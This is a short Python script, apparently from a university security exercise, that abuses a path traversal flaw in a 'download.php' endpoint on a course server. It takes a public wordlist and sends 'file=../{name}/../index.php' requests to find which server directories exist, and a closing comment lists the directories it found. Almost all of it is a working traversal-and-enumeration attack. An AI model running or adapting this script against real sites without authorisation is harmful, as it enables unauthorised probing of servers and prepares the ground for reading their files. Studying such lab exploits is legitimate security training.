import math

import requests
from pathlib import Path
from typing import Optional

SAVE_DIR = Path(__file__).parent
CLUB_URL = 'http://boura.fit.cvut.cz/nightclub/download.php'
DIR_LIST_SRC = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-small.txt'


def _main(name_source, start: int = 0, stop: Optional[int] = None):
    all_dir = []
    names = requests.get(name_source).text.strip().split('\n')

    for idx, name in enumerate(names[start:stop], start=start+1):
        if not name or name[0] == '#':
            continue
        req = requests.get(CLUB_URL, params={'file': f'../{name}/../index.php'})

        if req.text:
            print(f'Directory {name} exists')
            all_dir.append(name)

        if idx % 100 == 0:
            print(f'Completed: {idx}/{len(names)}')

    print(all_dir)


if __name__ == '__main__':
    _main(DIR_LIST_SRC, stop=20000)
    # 20000 search gets us ['images', 'downloads', 'style', 'extra', 'sql']
